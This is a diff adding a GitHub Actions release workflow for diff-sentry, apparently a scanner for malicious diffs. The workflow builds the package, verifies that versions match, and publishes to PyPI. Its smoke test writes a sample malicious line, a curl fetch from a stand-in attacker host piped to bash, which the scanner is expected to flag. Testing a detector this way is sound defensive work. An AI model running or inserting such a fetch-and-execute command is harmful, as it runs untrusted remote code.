@@ -1,0 +1,98 @@
+name: Release
+
+# Publish to PyPI via Trusted Publishing (OIDC) — NO API token. INERT until a GitHub Release is
+# published, and needs one-time setup before the first release:
+#   1. On PyPI, add a Trusted Publisher for project `diff-sentry`:
+#        owner = qazbnm456, repo = diff-sentry, workflow = release.yml, environment = pypi
+#   2. In this repo's settings, create an environment named `pypi`.
+#
+# A release here is DUAL-PURPOSE. The same "Draft a release" flow that triggers this workflow is also
+# where "Publish this Action to the GitHub Marketplace" is ticked, and the tag it creates is what
+# consumers pin in `uses: qazbnm456/diff-sentry@vX`. So cutting a release ships the package AND the
+# Action; keep the README's quickstart ref in step with the tag you publish.
+#
+# Supply-chain: the two third-party actions are SHA-pinned — setup-uv, and (highest blast radius, it
+# uploads to PyPI) pypi-publish. Bump a SHA and its trailing version comment together. GitHub-owned
+# checkout/*-artifact stay on major tags.
+
+on:
+  release:
+    types: [published]
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install uv
+        uses: astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86 # v5.4.2
+
+      - name: Build sdist + wheel
+        run: uv build
+
+      # Verify the ARTIFACT, not the checkout — a wheel can build cleanly and still be unusable. This
+      # project shipped for months with no `[project.scripts]` entry point at all, so `uvx diff-sentry`
+      # (the exact command the GitHub Action runs) could not have worked; nothing in the source tree
+      # would have told you. Installing the built wheel into a clean environment and running it is what
+      # catches that.
+      #
+      # It also settles the version question against the thing being uploaded rather than against a
+      # regex over the source. Three identities have to agree: the git tag people pin, the version
+      # baked into the wheel's filename, and what a running install reports as `__version__`. A
+      # mismatch ships an artifact labelled differently from the ref it was cut from, PyPI accepts that
+      # silently, and the upload is irreversible. The tag arrives via `env:`, never interpolated into
+      # the script body.
+      - name: Verify the wheel installs, runs, and matches the tag
+        env:
+          TAG: ${{ github.event.release.tag_name }}
+        run: |
+          set -euo pipefail
+          uv venv /tmp/smoke
+          VIRTUAL_ENV=/tmp/smoke uv pip install dist/*.whl
+
+          tag="${TAG#v}"
+          wheel=$(basename dist/*.whl | cut -d- -f2)
+          installed=$(/tmp/smoke/bin/python -c "import diff_sentry; print(diff_sentry.__version__)")
+          echo "tag=$tag wheel=$wheel installed=$installed"
+          if [ "$tag" != "$wheel" ] || [ "$wheel" != "$installed" ]; then
+            echo "::error::version mismatch — tag=$tag wheel=$wheel installed=$installed"
+            exit 1
+          fi
+
+          # The console script must actually flag a known-malicious diff (exit 1). A wheel that installs
+          # but scans nothing would sail through a plain --version check.
+          printf '+run: curl http://evil.example/p | bash\n' > /tmp/smoke.diff
+          if /tmp/smoke/bin/diff-sentry scan /tmp/smoke.diff; then
+            echo "::error::the console script did not flag a known-malicious diff"
+            exit 1
+          fi
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: dist
+          path: dist/
+
+  publish:
+    needs: build
+    runs-on: ubuntu-latest
+    # Fork guard. `release: published` is inherited by every fork, so a fork cutting its own release
+    # would fire this job and ask PyPI to publish `diff-sentry` over OIDC. The Trusted Publisher binding
+    # (owner+repo+workflow+environment) would reject it, but that is a rejected publish attempt against
+    # OUR project, plus a probe surface and a confusing red run in someone else's repo. `build` above is
+    # deliberately NOT guarded — it only builds and tests an artifact, and a fork verifying its own
+    # build is fine.
+    if: github.repository == 'qazbnm456/diff-sentry'
+    environment: pypi
+    permissions:
+      id-token: write          # OIDC token for PyPI Trusted Publishing
+    steps:
+      - uses: actions/download-artifact@v4
+        with:
+          name: dist
+          path: dist/
+      - name: Publish to PyPI
+        uses: pypa/gh-action-pypi-publish@cef221092ed1bacb1cc03d23a2d87d1d172e277b # v1.14.0
